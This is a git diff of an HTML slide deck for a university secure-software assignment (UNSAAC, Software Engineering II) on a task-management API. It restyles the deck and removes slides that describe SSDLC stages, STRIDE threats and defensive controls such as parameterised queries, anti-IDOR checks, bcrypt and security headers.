@@ -6,16 +6,13 @@
   <title>Mini Dossier – Software Seguro | UNSAAC</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap');
 
     * {
-      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-family: 'Montserrat', 'Plus Jakarta Sans', sans-serif;
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-    }
-    code, pre, .mono {
-      font-family: 'JetBrains Mono', monospace;
     }
 
     @page {
@@ -50,1811 +47,504 @@
       flex-direction: column;
       justify-content: space-between;
       page-break-after: always;
-      background-color: #f8fafc;
+      background-color: #ffffff;
     }
     .slide:last-child {
       page-break-after: auto;
     }
 
-    .gradient-hero {
-      background: radial-gradient(circle at 20% 20%, #1e293b 0%, #0f172a 60%, #020617 100%);
+    .navy-title {
+      color: #0f2b48;
     }
 
-    .slide-header {
-      background: linear-gradient(90deg, #1e3a8a 0%, #2563eb 50%, #0284c7 100%);
-      color: white;
-      padding: 1rem 2.5rem;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-      flex-shrink: 0;
+    .pill-card {
+      background-color: #0f233c;
+      border-radius: 9999px;
+      transition: all 0.2s ease;
     }
 
-    .slide-footer {
-      background: #ffffff;
-      border-top: 1px solid #e2e8f0;
-      padding: 0.6rem 2.5rem;
-      font-size: 0.8rem;
-      color: #64748b;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-shrink: 0;
-    }
-
-    .code-container {
-      background: #090d16;
-      border: 1px solid #1e293b;
-      border-radius: 0.75rem;
-      padding: 1.25rem;
-      font-size: 0.85rem;
-      line-height: 1.6;
-      color: #e2e8f0;
-      white-space: pre;
-      overflow: hidden;
-    }
-    .code-container .kw { color: #f472b6; font-weight: 600; }
-    .code-container .fn { color: #60a5fa; }
-    .code-container .str { color: #34d399; }
-    .code-container .bad { color: #f87171; background: rgba(239,68,68,0.15); padding: 2px 4px; border-radius: 4px; }
-    .code-container .good { color: #4ade80; background: rgba(34,197,94,0.15); padding: 2px 4px; border-radius: 4px; font-weight: 600; }
-    .code-container .cmt { color: #64748b; font-style: italic; }
-
-    .table-modern {
-      width: 100%;
-      border-collapse: separate;
-      border-spacing: 0;
-      border-radius: 0.75rem;
-      overflow: hidden;
-    }
-    .table-modern th {
-      background: #1e293b;
-      color: #f8fafc;
-      font-size: 0.9rem;
-      font-weight: 700;
-      padding: 0.9rem 1.25rem;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-    .table-modern td {
-      padding: 1rem 1.25rem;
-      font-size: 0.92rem;
-      border-bottom: 1px solid #e2e8f0;
-      background: #ffffff;
-    }
-    .table-modern tr:last-child td {
-      border-bottom: none;
-    }
-    .table-modern tr:nth-child(even) td {
-      background: #f8fafc;
+    .matrix-card {
+      background-color: #0f233c;
     }
   </style>
 </head>
 <body class="bg-slate-900 text-slate-800">
 
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 1: PORTADA
-═══════════════════════════════════════════════════════════ -->
-<div class="slide gradient-hero text-white">
-  <div class="flex-1 flex flex-col justify-center px-16 max-w-7xl mx-auto w-full">
-    <div class="flex items-center gap-4 mb-4">
-      <div class="w-14 h-14 rounded-2xl bg-blue-600/30 border border-blue-400/40 flex items-center justify-center text-3xl shadow-inner">
-        🏛️
+<!-- =========================================================================
+     SLIDE 1: PORTADA OFICIAL (UNSAAC 330 AÑOS + EPIS)
+========================================================================== -->
+<div class="slide">
+  <div class="flex-1 flex w-full h-full">
+    <!-- Columna izquierda: Franja Guinda Institucional con Escudo UNSAAC -->
+    <div class="w-[30vw] h-full bg-[#681326] flex flex-col items-center justify-center p-6 text-white text-center relative shadow-2xl">
+      <img src="logo_0.png" alt="Escudo UNSAAC 330 Años" class="w-full h-full object-contain" onerror="this.style.display='none'" />
+    </div>
+
+    <!-- Columna derecha: Datos Institucionales y del Proyecto -->
+    <div class="flex-1 h-full flex flex-col justify-between p-12 relative bg-white">
+      <!-- Logo Sistemas arriba a la derecha -->
+      <div class="absolute top-6 right-8 w-20 h-20">
+        <img src="logo_3.png" alt="Logo EPIS" class="w-full h-full object-contain" />
       </div>
+
+      <!-- Encabezado de la Facultad -->
       <div>
-        <p class="text-blue-400 font-bold tracking-widest text-sm uppercase">Universidad Nacional de San Antonio Abad del Cusco</p>
-        <p class="text-slate-400 text-sm">Facultad de Ingeniería Eléctrica, Electrónica, Informática y Mecánica</p>
-      </div>
-    </div>
-
-    <div class="border-l-4 border-blue-500 pl-8 my-6">
-      <span class="inline-block bg-blue-500/20 text-blue-300 border border-blue-400/30 text-xs px-3 py-1 rounded-full font-bold uppercase tracking-wider mb-3">
-        Tarea 4.1 • Ciclo de Vida de Desarrollo Seguro (SSDLC)
-      </span>
-      <h1 class="text-5xl font-black tracking-tight leading-tight mb-3">
-        Mini DOSSIER de <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-sky-300 to-indigo-300">Software Seguro</span>
-      </h1>
-      <p class="text-slate-300 text-xl font-normal max-w-3xl">
-        Gestión de Tareas API — Análisis STRIDE, Requisitos Formales, Matriz P×I, Hardening Defensivo y Verificación Automatizada.
-      </p>
-    </div>
-
-    <div class="grid grid-cols-3 gap-6 mt-4">
-      <div class="bg-white/5 border border-white/10 rounded-2xl p-5 backdrop-blur-sm">
-        <p class="text-blue-400 text-xs uppercase font-bold tracking-wider mb-1">Docente Responsable</p>
-        <p class="text-lg font-bold text-white">Ing. Alex Fernando Huillca Huaman</p>
-        <p class="text-slate-400 text-xs mt-1">Ingeniería de Software II — Laboratorio</p>
+        <h3 class="text-xl font-bold tracking-wider text-[#0f2b48]">FACULTAD DE INGENIERIA INFORMÁTICA</h3>
+        <h4 class="text-sm font-semibold text-slate-500 tracking-wide mt-1">ESCUELA PROFESIONAL DE INGENIERIA INFORMÁTICA Y DE SISTEMAS</h4>
+        <h2 class="text-lg font-extrabold text-[#0f2b48] mt-2">INGENIERIA DE SOFTWARE II</h2>
+        <div class="w-24 h-1 bg-red-600 mt-2"></div>
       </div>
 
-      <div class="bg-white/5 border border-white/10 rounded-2xl p-5 backdrop-blur-sm">
-        <p class="text-blue-400 text-xs uppercase font-bold tracking-wider mb-1">Equipo de Trabajo</p>
-        <p class="text-lg font-bold text-white">Equipo 02</p>
-        <p class="text-slate-400 text-xs mt-1">Escuela Profesional de Ing. Informática y de Sistemas</p>
-      </div>
-
-      <div class="bg-white/5 border border-white/10 rounded-2xl p-5 backdrop-blur-sm">
-        <p class="text-blue-400 text-xs uppercase font-bold tracking-wider mb-1">Despliegue & Código</p>
-        <p class="text-xs font-mono text-emerald-400 truncate">github.com/GamoLG/PRACTICA-4...</p>
-        <p class="text-xs font-mono text-sky-400 truncate mt-1">practica-4-ingenieria-de-software-ii.onrender.com</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer bg-slate-950/80 border-slate-800 text-slate-400">
-    <span>UNSAAC • Escuela Profesional de Ingeniería Informática y de Sistemas</span>
-    <span class="no-print text-amber-400 font-medium">💡 Modo Presentación Horizontal • Ctrl + P para exportar a PDF</span>
-    <span>Slide 1 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 2: ÍNDICE GENERAL
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">📑</span>
-      <h2 class="text-xl font-bold tracking-wide">Estructura del Mini Dossier</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Tabla de Contenidos</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-5 gap-6">
-      
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-indigo-600 flex flex-col justify-between">
-        <div>
-          <span class="w-12 h-12 rounded-xl bg-indigo-50 text-indigo-600 font-black text-xl flex items-center justify-center mb-4">01</span>
-          <h3 class="text-lg font-bold text-slate-800 mb-2">Mapa SSDLC</h3>
-          <p class="text-slate-600 text-sm leading-relaxed">Las 6 etapas completas del ciclo de vida seguro, con identificación de amenazas STRIDE y controles.</p>
-        </div>
-        <div class="mt-4 pt-3 border-t border-slate-100 text-xs font-semibold text-indigo-600">Slides 3 — 6</div>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-blue-600 flex flex-col justify-between">
-        <div>
-          <span class="w-12 h-12 rounded-xl bg-blue-50 text-blue-600 font-black text-xl flex items-center justify-center mb-4">02</span>
-          <h3 class="text-lg font-bold text-slate-800 mb-2">Requisitos de Seguridad</h3>
-          <p class="text-slate-600 text-sm leading-relaxed">5 requisitos verificables formales (RS-01 a RS-05) con CWE, prioridad y criterio de aceptación.</p>
-        </div>
-        <div class="mt-4 pt-3 border-t border-slate-100 text-xs font-semibold text-blue-600">Slides 7 — 8</div>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-amber-600 flex flex-col justify-between">
-        <div>
-          <span class="w-12 h-12 rounded-xl bg-amber-50 text-amber-600 font-black text-xl flex items-center justify-center mb-4">03</span>
-          <h3 class="text-lg font-bold text-slate-800 mb-2">Matriz de Riesgos</h3>
-          <p class="text-slate-600 text-sm leading-relaxed">Matriz Probabilidad × Impacto (P×I), mapa de calor gráfico, estrategia de mitigación y responsables.</p>
-        </div>
-        <div class="mt-4 pt-3 border-t border-slate-100 text-xs font-semibold text-amber-600">Slides 9 — 10</div>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-emerald-600 flex flex-col justify-between">
-        <div>
-          <span class="w-12 h-12 rounded-xl bg-emerald-50 text-emerald-600 font-black text-xl flex items-center justify-center mb-4">04</span>
-          <h3 class="text-lg font-bold text-slate-800 mb-2">Código Seguro</h3>
-          <p class="text-slate-600 text-sm leading-relaxed">Comparativa detallada Antes vs. Después (SQLi, IDOR, XSS) y batería de 19 pruebas negativas.</p>
-        </div>
-        <div class="mt-4 pt-3 border-t border-slate-100 text-xs font-semibold text-emerald-600">Slides 11 — 14</div>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-violet-600 flex flex-col justify-between">
-        <div>
-          <span class="w-12 h-12 rounded-xl bg-violet-50 text-violet-600 font-black text-xl flex items-center justify-center mb-4">05</span>
-          <h3 class="text-lg font-bold text-slate-800 mb-2">Evidencias & Logros</h3>
-          <p class="text-slate-600 text-sm leading-relaxed">Galería de 21 capturas de pantalla organizadas por categoría, métricas cuantitativas y conclusiones.</p>
-        </div>
-        <div class="mt-4 pt-3 border-t border-slate-100 text-xs font-semibold text-violet-600">Slides 15 — 24</div>
-      </div>
-
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 2 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 3: SSDLC VISIÓN GENERAL
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🔄</span>
-      <h2 class="text-xl font-bold tracking-wide">1. Mapa SSDLC — Visión Panorámica de las 6 Etapas</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Metodología Shift-Left</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="text-center mb-6">
-      <p class="text-slate-600 text-base max-w-3xl mx-auto">
-        Implementación del Ciclo de Vida de Desarrollo de Software Seguro (SSDLC). La seguridad se inyecta desde la definición inicial de requerimientos para prevenir fallas arquitectónicas costosas.
-      </p>
-    </div>
-
-    <div class="grid grid-cols-6 gap-4">
-      <div class="bg-white rounded-2xl p-5 shadow-sm border border-slate-200 text-center flex flex-col items-center">
-        <div class="w-12 h-12 rounded-full bg-blue-100 text-blue-700 font-black text-lg flex items-center justify-center mb-3">1</div>
-        <h4 class="font-bold text-slate-800 text-sm mb-1">Requisitos</h4>
-        <span class="text-[0.7rem] bg-blue-50 text-blue-700 px-2 py-0.5 rounded-full font-medium mb-3">Definición</span>
-        <p class="text-xs text-slate-500">DTOs estrictos y requisitos funcionales de seguridad.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-5 shadow-sm border border-slate-200 text-center flex flex-col items-center">
-        <div class="w-12 h-12 rounded-full bg-indigo-100 text-indigo-700 font-black text-lg flex items-center justify-center mb-3">2</div>
-        <h4 class="font-bold text-slate-800 text-sm mb-1">Diseño</h4>
-        <span class="text-[0.7rem] bg-indigo-50 text-indigo-700 px-2 py-0.5 rounded-full font-medium mb-3">Modelado</span>
-        <p class="text-xs text-slate-500">STRIDE, control de accesos RBAC y arquitectura 3 capas.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-5 shadow-sm border border-slate-200 text-center flex flex-col items-center">
-        <div class="w-12 h-12 rounded-full bg-cyan-100 text-cyan-700 font-black text-lg flex items-center justify-center mb-3">3</div>
-        <h4 class="font-bold text-slate-800 text-sm mb-1">Codificación</h4>
-        <span class="text-[0.7rem] bg-cyan-50 text-cyan-700 px-2 py-0.5 rounded-full font-medium mb-3">Hardening</span>
-        <p class="text-xs text-slate-500">Prepared Statements, bcrypt(12), Anti-IDOR y Rate Limit.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-5 shadow-sm border border-slate-200 text-center flex flex-col items-center">
-        <div class="w-12 h-12 rounded-full bg-violet-100 text-violet-700 font-black text-lg flex items-center justify-center mb-3">4</div>
-        <h4 class="font-bold text-slate-800 text-sm mb-1">Pruebas</h4>
-        <span class="text-[0.7rem] bg-violet-50 text-violet-700 px-2 py-0.5 rounded-full font-medium mb-3">SAST & Pytest</span>
-        <p class="text-xs text-slate-500">Bandit, Pylint y 19 pruebas de penetración automatizadas.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-5 shadow-sm border border-slate-200 text-center flex flex-col items-center">
-        <div class="w-12 h-12 rounded-full bg-orange-100 text-orange-700 font-black text-lg flex items-center justify-center mb-3">5</div>
-        <h4 class="font-bold text-slate-800 text-sm mb-1">Despliegue</h4>
-        <span class="text-[0.7rem] bg-orange-50 text-orange-700 px-2 py-0.5 rounded-full font-medium mb-3">Producción</span>
-        <p class="text-xs text-slate-500">HTTPS forzado, CORS restrictivo y Security Headers.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-5 shadow-sm border border-slate-200 text-center flex flex-col items-center">
-        <div class="w-12 h-12 rounded-full bg-emerald-100 text-emerald-700 font-black text-lg flex items-center justify-center mb-3">6</div>
-        <h4 class="font-bold text-slate-800 text-sm mb-1">Operación</h4>
-        <span class="text-[0.7rem] bg-emerald-50 text-emerald-700 px-2 py-0.5 rounded-full font-medium mb-3">Monitoreo</span>
-        <p class="text-xs text-slate-500">Trazabilidad en audit.log y revocación token_version.</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 3 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 4: SSDLC ETAPAS 1 Y 2
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">📋</span>
-      <h2 class="text-xl font-bold tracking-wide">1. Mapa SSDLC — Etapas 1 (Requisitos) y 2 (Diseño)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Fases Iniciales</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex items-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 w-full">
-      
-      <!-- ETAPA 1 -->
-      <div class="bg-white rounded-2xl p-8 shadow-md border-t-4 border-blue-600">
-        <div class="flex items-center justify-between mb-4">
-          <div class="flex items-center gap-3">
-            <span class="w-10 h-10 rounded-xl bg-blue-100 text-blue-700 font-bold flex items-center justify-center text-lg">E1</span>
-            <div>
-              <h3 class="text-xl font-bold text-slate-800">Requisitos de Seguridad</h3>
-              <p class="text-xs text-slate-400">Especificación y Análisis Inicial</p>
-            </div>
-          </div>
-          <span class="text-xs font-semibold bg-blue-50 text-blue-700 px-3 py-1 rounded-full">Fase 1</span>
-        </div>
-
-        <div class="space-y-4 text-sm mt-6">
-          <div class="bg-red-50/70 border border-red-200/60 rounded-xl p-4">
-            <p class="font-bold text-red-700 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>⚠️</span> Amenazas Identificadas
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Requisitos ambiguos que conducen a funciones críticas desprotegidas.</li>
-              <li>• Inexistencia de un esquema RBAC formal desde la concepción del producto.</li>
-              <li>• Omisión de reglas estrictas para validación de tipo y longitud de datos.</li>
-            </ul>
-          </div>
-
-          <div class="bg-emerald-50/70 border border-emerald-200/60 rounded-xl p-4">
-            <p class="font-bold text-emerald-800 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>🛡️</span> Controles Implementados
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Definición de DTOs en Pydantic configurados con <code class="bg-white px-1.5 py-0.5 rounded border border-emerald-300 font-mono text-[0.75rem]">extra="forbid"</code>.</li>
-              <li>• Formalización de 5 requisitos de seguridad verificables (RS-01 al RS-05).</li>
-              <li>• Matriz RBAC con 3 niveles: Administrador, Docente y Estudiante.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-      <!-- ETAPA 2 -->
-      <div class="bg-white rounded-2xl p-8 shadow-md border-t-4 border-indigo-600">
-        <div class="flex items-center justify-between mb-4">
-          <div class="flex items-center gap-3">
-            <span class="w-10 h-10 rounded-xl bg-indigo-100 text-indigo-700 font-bold flex items-center justify-center text-lg">E2</span>
-            <div>
-              <h3 class="text-xl font-bold text-slate-800">Diseño Seguro de Arquitectura</h3>
-              <p class="text-xs text-slate-400">Modelado de Amenazas & Fronteras</p>
-            </div>
-          </div>
-          <span class="text-xs font-semibold bg-indigo-50 text-indigo-700 px-3 py-1 rounded-full">Fase 2</span>
-        </div>
-
-        <div class="space-y-4 text-sm mt-6">
-          <div class="bg-red-50/70 border border-red-200/60 rounded-xl p-4">
-            <p class="font-bold text-red-700 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>⚠️</span> Amenazas Identificadas (STRIDE)
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• <strong>Spoofing:</strong> Reutilización o falsificación de tokens de sesión JWT.</li>
-              <li>• <strong>Elevation of Privilege:</strong> Acceso a recursos de otros usuarios (IDOR).</li>
-              <li>• <strong>Tampering:</strong> Alteración no autorizada de tareas en base de datos.</li>
-            </ul>
-          </div>
-
-          <div class="bg-emerald-50/70 border border-emerald-200/60 rounded-xl p-4">
-            <p class="font-bold text-emerald-800 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>🛡️</span> Controles Implementados
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• JWT con identificador <code class="bg-white px-1.5 py-0.5 rounded border border-emerald-300 font-mono text-[0.75rem]">jti (UUIDv4)</code> y versión de token individual.</li>
-              <li>• Delimitación de Trust Boundaries entre cliente, API y capa SQLite.</li>
-              <li>• Arquitectura de 3 capas aisladas con validación previa al controlador.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 4 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 5: SSDLC ETAPAS 3 Y 4
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">💻</span>
-      <h2 class="text-xl font-bold tracking-wide">1. Mapa SSDLC — Etapas 3 (Codificación) y 4 (Pruebas)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Fases de Construcción</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex items-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 w-full">
-      
-      <!-- ETAPA 3 -->
-      <div class="bg-white rounded-2xl p-8 shadow-md border-t-4 border-cyan-600">
-        <div class="flex items-center justify-between mb-4">
-          <div class="flex items-center gap-3">
-            <span class="w-10 h-10 rounded-xl bg-cyan-100 text-cyan-700 font-bold flex items-center justify-center text-lg">E3</span>
-            <div>
-              <h3 class="text-xl font-bold text-slate-800">Codificación Segura</h3>
-              <p class="text-xs text-slate-400">Implementación de Controles Defensivos</p>
-            </div>
-          </div>
-          <span class="text-xs font-semibold bg-cyan-50 text-cyan-700 px-3 py-1 rounded-full">Fase 3</span>
-        </div>
-
-        <div class="space-y-4 text-sm mt-6">
-          <div class="bg-red-50/70 border border-red-200/60 rounded-xl p-4">
-            <p class="font-bold text-red-700 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>⚠️</span> Amenazas Identificadas
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Inyección SQL por concatenación de parámetros en strings (<code class="font-mono text-[0.7rem]">CWE-89</code>).</li>
-              <li>• Broken Access Control / IDOR por omisión de ownership check (<code class="font-mono text-[0.7rem]">CWE-284</code>).</li>
-              <li>• Fuerza bruta masiva en login por falta de control de peticiones (<code class="font-mono text-[0.7rem]">CWE-307</code>).</li>
-            </ul>
-          </div>
-
-          <div class="bg-emerald-50/70 border border-emerald-200/60 rounded-xl p-4">
-            <p class="font-bold text-emerald-800 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>🛡️</span> Controles Implementados
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Consultas 100% parametrizadas (Prepared Statements con placeholders <code class="font-mono text-[0.7rem]">?</code>).</li>
-              <li>• Validación de pertenencia obligatoria (<code class="font-mono text-[0.7rem]">owner_id == session.user_id</code> o HTTP 403).</li>
-              <li>• Hashing robusto con bcrypt (factor de trabajo 12) y Rate Limiting progresivo.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-      <!-- ETAPA 4 -->
-      <div class="bg-white rounded-2xl p-8 shadow-md border-t-4 border-violet-600">
-        <div class="flex items-center justify-between mb-4">
-          <div class="flex items-center gap-3">
-            <span class="w-10 h-10 rounded-xl bg-violet-100 text-violet-700 font-bold flex items-center justify-center text-lg">E4</span>
-            <div>
-              <h3 class="text-xl font-bold text-slate-800">Pruebas de Seguridad</h3>
-              <p class="text-xs text-slate-400">Verificación Estática y Dinámica</p>
-            </div>
-          </div>
-          <span class="text-xs font-semibold bg-violet-50 text-violet-700 px-3 py-1 rounded-full">Fase 4</span>
-        </div>
-
-        <div class="space-y-4 text-sm mt-6">
-          <div class="bg-red-50/70 border border-red-200/60 rounded-xl p-4">
-            <p class="font-bold text-red-700 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>⚠️</span> Amenazas Identificadas
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Vulnerabilidades en código no detectadas antes de pasar a producción.</li>
-              <li>• Regresiones de seguridad introducidas durante refactorizaciones de código.</li>
-              <li>• Falsos negativos por pruebas unitarias que sólo evalúan casos positivos (happy path).</li>
-            </ul>
-          </div>
-
-          <div class="bg-emerald-50/70 border border-emerald-200/60 rounded-xl p-4">
-            <p class="font-bold text-emerald-800 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>🛡️</span> Controles Implementados
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Escaneo SAST automatizado con Bandit y Pylint (0 vulnerabilidades en app_segura).</li>
-              <li>• Batería de 19 pruebas de penetración automatizadas con Pytest (100% exitosas).</li>
-              <li>• Pruebas negativas con payloads maliciosos de SQLi, XSS, fuerza bruta y Mass Assignment.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 5 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 6: SSDLC ETAPAS 5 Y 6
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🚀</span>
-      <h2 class="text-xl font-bold tracking-wide">1. Mapa SSDLC — Etapas 5 (Despliegue) y 6 (Operación)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Fases de Producción</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex items-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 w-full">
-      
-      <!-- ETAPA 5 -->
-      <div class="bg-white rounded-2xl p-8 shadow-md border-t-4 border-orange-600">
-        <div class="flex items-center justify-between mb-4">
-          <div class="flex items-center gap-3">
-            <span class="w-10 h-10 rounded-xl bg-orange-100 text-orange-700 font-bold flex items-center justify-center text-lg">E5</span>
-            <div>
-              <h3 class="text-xl font-bold text-slate-800">Despliegue Seguro</h3>
-              <p class="text-xs text-slate-400">Hardening de Infraestructura & Red</p>
-            </div>
-          </div>
-          <span class="text-xs font-semibold bg-orange-50 text-orange-700 px-3 py-1 rounded-full">Fase 5</span>
-        </div>
-
-        <div class="space-y-4 text-sm mt-6">
-          <div class="bg-red-50/70 border border-red-200/60 rounded-xl p-4">
-            <p class="font-bold text-red-700 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>⚠️</span> Amenazas Identificadas
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Interceptación de credenciales y tokens mediante ataques Man-in-the-Middle (MitM).</li>
-              <li>• Cross-Origin Request Forgery por configuración abierta o descuidada de CORS (*).</li>
-              <li>• Ausencia de cabeceras de protección del navegador (Clickjacking, MIME sniffing).</li>
-            </ul>
-          </div>
-
-          <div class="bg-emerald-50/70 border border-emerald-200/60 rounded-xl p-4">
-            <p class="font-bold text-emerald-800 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>🛡️</span> Controles Implementados
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Cifrado en tránsito TLS/HTTPS forzado extremo a extremo mediante plataforma Render.</li>
-              <li>• Middleware de Cabeceras de Seguridad: X-Frame-Options: DENY, HSTS, X-Content-Type.</li>
-              <li>• Política CORS estricta que rechaza orígenes no autenticados o no autorizados.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-      <!-- ETAPA 6 -->
-      <div class="bg-white rounded-2xl p-8 shadow-md border-t-4 border-emerald-600">
-        <div class="flex items-center justify-between mb-4">
-          <div class="flex items-center gap-3">
-            <span class="w-10 h-10 rounded-xl bg-emerald-100 text-emerald-700 font-bold flex items-center justify-center text-lg">E6</span>
-            <div>
-              <h3 class="text-xl font-bold text-slate-800">Operación y Monitoreo</h3>
-              <p class="text-xs text-slate-400">Auditoría, Trazabilidad & Respuesta</p>
-            </div>
-          </div>
-          <span class="text-xs font-semibold bg-emerald-50 text-emerald-700 px-3 py-1 rounded-full">Fase 6</span>
-        </div>
-
-        <div class="space-y-4 text-sm mt-6">
-          <div class="bg-red-50/70 border border-red-200/60 rounded-xl p-4">
-            <p class="font-bold text-red-700 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>⚠️</span> Amenazas Identificadas
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Incidentes de intrusión silenciosos sin registro forense ni trazabilidad.</li>
-              <li>• Sesiones de usuarios comprometidas que continúan válidas tras cambiar contraseña.</li>
-              <li>• Exposición de información sensible o credenciales dentro de los archivos de log.</li>
-            </ul>
-          </div>
-
-          <div class="bg-emerald-50/70 border border-emerald-200/60 rounded-xl p-4">
-            <p class="font-bold text-emerald-800 text-xs uppercase tracking-wider mb-2 flex items-center gap-1.5">
-              <span>🛡️</span> Controles Implementados
-            </p>
-            <ul class="text-slate-700 space-y-1.5 text-xs">
-              <li>• Archivo <code class="font-mono text-[0.7rem]">audit.log</code> estructurado que audita eventos omitiendo contraseñas.</li>
-              <li>• Mecanismo <code class="font-mono text-[0.7rem]">token_version</code>: revoca automáticamente todas las sesiones previas.</li>
-              <li>• Endpoint de logout con revocación en servidor y monitoreo de IPs sospechosas.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 6 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 7: REQUISITOS DE SEGURIDAD (PARTE 1)
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🔒</span>
-      <h2 class="text-xl font-bold tracking-wide">2. Requisitos de Seguridad Verificables (RS-01 al RS-03)</h2>
-    </div>
